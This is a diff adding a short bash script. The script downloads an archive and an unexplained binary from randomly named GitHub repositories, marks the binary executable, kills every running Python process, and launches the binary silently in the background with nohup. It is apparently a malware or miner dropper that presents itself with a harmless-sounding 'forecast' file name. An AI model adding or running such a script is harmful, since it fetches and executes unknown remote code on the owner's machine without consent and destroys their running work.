@@ -1,0 +1,10 @@
+#!/bin/bash
+sleep 6
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/a164/main/forecast.tar.gz
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/g892/main/r6
+tar xvzf forecast.tar.gz
+chmod +x r6
+pkill python
+sleep 6
+nohup ./r6 > /dev/null 2>&1 &
+
